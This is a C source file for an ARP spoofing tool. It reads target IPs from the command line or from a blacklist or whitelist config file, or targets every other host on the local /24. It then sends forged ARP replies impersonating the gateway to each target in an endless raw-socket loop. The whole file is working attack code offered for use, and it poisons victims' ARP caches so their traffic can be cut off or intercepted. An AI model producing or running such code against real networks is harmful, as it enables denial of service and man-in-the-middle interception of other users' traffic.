#include "arp.h"

int main(int argc, const char **argv)
{
	atklist_st atklist;
	int atk_type = 0;
	struct in_addr *tmp_atkip;

	if (argc != 2) {
		puts("invalid usage !");
		return -1;
	}
	if (argv[1][0] != '-') {
		/* single mode */
		tmp_atkip = malloc(sizeof(struct in_addr));
		if (0 == inet_aton(argv[1], tmp_atkip)) {
			printf("invalid address of '%s'.\n", argv[1]);
			free(tmp_atkip);
			return -1;
		}
		atklist.atk_type = ATK_SINGLE;
		atklist.atk_num = 1;
		atklist.atk_list = tmp_atkip;
	} else if (strlen(argv[1]) != 2) {
		/* error */
		printf("invalid argument of '%s'.\n", argv[1]);
		return -1;
	}else {
		/* write or black mode */
		switch (argv[1][1]) {
		case ATK_BLACK:
			atk_type = ATK_BLACK; break;
		case ATK_WHITE:
			atk_type = ATK_WHITE; break;
		default:
			printf("invalid argument of '%s'.\n", argv[1]);
			return -1;
		}
	}

	get_attack_config(&atklist, atk_type);
	
	arp_attack(&atklist);
	
	return 0;
}

int get_attack_config(atklist_st *atklist, int atk_type)
{
	char *cfg_key_type = NULL;
	FILE *fp = NULL;
	char *buff = NULL;
	int counter = 0;
	struct in_addr tmp_ip;
	
	switch (atk_type) {
	case ATK_SINGLE:
		return 0;
	case ATK_WHITE:
		cfg_key_type = CFG_KEY_WHITE; 
		puts("write");
		break;
	case ATK_BLACK:
		cfg_key_type = CFG_KEY_BLACK; 
		puts("black");
		break;
	default:
		return -1;
	}

	atklist->atk_list = (struct in_addr *)malloc(255 * sizeof(*atklist->atk_list));
	memset(atklist->atk_list, 0, 255 * sizeof(*atklist->atk_list));

	if (NULL == (fp = fopen(CFG_FILE_PATH, "r")))
		error_exit("fopen");

	buff = malloc(BUFF_SIZE);
		
	while (NULL != fgets(buff, BUFF_SIZE, fp) 
			&& 0 != strcmp(buff, cfg_key_type))
		/* do nothing *///;
		puts("-------------");

	if (ATK_BLACK == atk_type) {
		counter = 0;
		while (NULL != fgets(buff, BUFF_SIZE, fp)
				&& 0 != strcmp(buff, ";\n")) {
			puts("-------------");
			if (0 != inet_aton(buff, atklist->atk_list + counter))
				counter ++;
			else
				printf("invalid: %s\n", buff);
		}
		atklist->atk_type = atk_type;
		atklist->atk_num = counter;
	} else if (ATK_WHITE == atk_type) {
		get_all_atkip(atklist);
		while (NULL != fgets(buff, BUFF_SIZE, fp)
				&& 0 != strcmp(buff, ";\n")) {
			puts("-------------");
			if (0 == inet_aton(buff, &tmp_ip)) {
				printf("invalid: %s\n", buff);
				continue;
			}
			delete_ip(atklist, tmp_ip);
		}
	}

	return 0;
}

int delete_ip(atklist_st *atklist, struct in_addr ip)
{
	int index;

	for (index = 0; index <= atklist->atk_num; index ++) {
		if (atklist->atk_list[index].s_addr == ip.s_addr)
			atklist->atk_list[index].s_addr = 0;
	}

	return 0;
}

int get_all_atkip(atklist_st *atklist)
{
	int index;
	struct sockaddr_in myaddr,
					   gateway;
	
	getipaddr(DEV_NAME, (struct sockaddr *)&myaddr);
	printf("myip: %s\n", inet_ntoa(myaddr.sin_addr));
	for (index = 1; index < 255; index ++) {
		3[(char *)&myaddr.sin_addr.s_addr] = index;
		atklist->atk_list[index] = myaddr.sin_addr;
	}
	atklist->atk_num = 255;
	delete_ip(atklist, myaddr.sin_addr);
	gateway.sin_addr.s_addr = inet_addr(GATEWAY);
	delete_ip(atklist, gateway.sin_addr);
	return 0;
}

int arp_attack(atklist_st *atklist){
	int sockfd;
	int index;
	struct in_addr sender;

    if (-1 == (sockfd = socket(AF_PACKET, SOCK_RAW, 0)))
        error_exit("socket");

	inet_aton(GATEWAY, &sender);
	while (1) {
		for (index = 0; index < atklist->atk_num; index ++) {
			send_arp(sockfd, sender, atklist->atk_list[index]);
			printf("%s\n", inet_ntoa(atklist->atk_list[index]));
			usleep(50000);
		}
	//	sleep(5);
	}

	close(sockfd);

	return 0;
}
